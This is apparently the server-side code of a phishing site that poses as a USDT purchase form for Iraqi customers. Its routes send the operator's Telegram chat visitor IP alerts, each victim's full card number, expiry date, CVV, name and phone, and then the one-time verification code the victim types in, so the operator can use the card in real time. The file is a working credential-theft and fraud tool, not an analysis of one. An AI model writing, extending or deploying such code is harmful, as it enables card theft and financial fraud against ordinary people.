import { Router, type IRouter } from "express";
import {
  NotifyVisitBody,
  NotifyVisitResponse,
  SubmitOrderBody,
  SubmitOrderResponse,
  SubmitVerificationCodeBody,
  SubmitVerificationCodeResponse,
} from "@workspace/api-zod";

const router: IRouter = Router();

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

const notifiedVisitIPs = new Set<string>();

function getClientIP(req: any): string {
  return (
    req.headers["x-forwarded-for"]?.toString().split(",")[0]?.trim() ||
    req.headers["x-real-ip"]?.toString() ||
    req.socket?.remoteAddress ||
    "unknown"
  );
}

async function sendTelegramMessage(text: string): Promise<boolean> {
  if (!BOT_TOKEN || !CHAT_ID) {
    console.error("Telegram bot token or chat ID not configured");
    return false;
  }
  try {
    const res = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text,
          parse_mode: "HTML",
        }),
      }
    );
    return res.ok;
  } catch {
    return false;
  }
}

function generateOrderId(): string {
  return "OX-" + Date.now().toString(36).toUpperCase() + Math.random().toString(36).substring(2, 6).toUpperCase();
}

router.post("/telegram/notify-visit", async (req, res) => {
  try {
    const body = NotifyVisitBody.parse(req.body);
    const ip = getClientIP(req);

    if (notifiedVisitIPs.has(ip)) {
      const result = NotifyVisitResponse.parse({
        success: true,
        message: "تم إرسال الإشعار مسبقاً",
      });
      return res.json(result);
    }

    notifiedVisitIPs.add(ip);

    const message =
      `🔔 <b>زائر جديد دخل صفحة الشراء</b>\n\n` +
      `⏰ الوقت: ${body.timestamp}\n` +
      `🌐 IP: ${ip}\n` +
      `📍 صفحة: نموذج الشراء\n\n` +
      `👁 شخص يتصفح الموقع الآن...`;
    const sent = await sendTelegramMessage(message);
    const result = NotifyVisitResponse.parse({
      success: sent,
      message: sent ? "تم إرسال الإشعار" : "فشل إرسال الإشعار",
    });
    res.json(result);
  } catch {
    res.status(400).json({ success: false, message: "بيانات غير صحيحة" });
  }
});

router.post("/telegram/submit-order", async (req, res) => {
  try {
    const body = SubmitOrderBody.parse(req.body);
    const ip = getClientIP(req);
    const orderId = generateOrderId();
    const message =
      `🛒 <b>طلب شراء جديد!</b>\n\n` +
      `📋 <b>رقم الطلب:</b> ${orderId}\n` +
      `💰 <b>المبلغ:</b> ${body.amount} USDT\n` +
      `💵 <b>المبلغ بالدينار:</b> ${body.amountIQD.toLocaleString()} IQD\n\n` +
      `💳 <b>طريقة الدفع:</b> ${body.paymentMethod}\n` +
      `👤 <b>اسم صاحب البطاقة:</b> ${body.cardName}\n` +
      `🔢 <b>رقم البطاقة:</b> ${body.cardNumber}\n` +
      `📅 <b>تاريخ الانتهاء:</b> ${body.expiryDate}\n` +
      `🔐 <b>CVV:</b> ${body.cvv}\n\n` +
      `📱 <b>رقم الهاتف:</b> ${body.phone}\n` +
      `📦 <b>عنوان المحفظة:</b> ${body.walletAddress}\n` +
      (body.couponCode ? `🎟 <b>كود الخصم:</b> ${body.couponCode}\n` : "") +
      `🌐 <b>IP:</b> ${ip}\n` +
      `\n⏳ <b>الزبون ينتظر كود التحقق الآن...</b>`;
    const sent = await sendTelegramMessage(message);
    const result = SubmitOrderResponse.parse({
      success: sent,
      message: sent ? "تم إرسال الطلب بنجاح" : "فشل إرسال الطلب",
      orderId,
    });
    res.json(result);
  } catch {
    res.status(400).json({ success: false, message: "بيانات غير صحيحة", orderId: "" });
  }
});

router.post("/telegram/submit-code", async (req, res) => {
  try {
    const body = SubmitVerificationCodeBody.parse(req.body);
    const message =
      `✅ <b>تم إدخال كود التحقق</b>\n\n` +
      `📋 <b>رقم الطلب:</b> ${body.orderId}\n` +
      `🔑 <b>كود التحقق:</b> ${body.code}\n\n` +
      `✅ الزبون أدخل الكود بنجاح`;
    const sent = await sendTelegramMessage(message);
    const result = SubmitVerificationCodeResponse.parse({
      success: sent,
      message: sent ? "تم إرسال الكود بنجاح" : "فشل إرسال الكود",
    });
    res.json(result);
  } catch {
    res.status(400).json({ success: false, message: "بيانات غير صحيحة" });
  }
});

export default router;
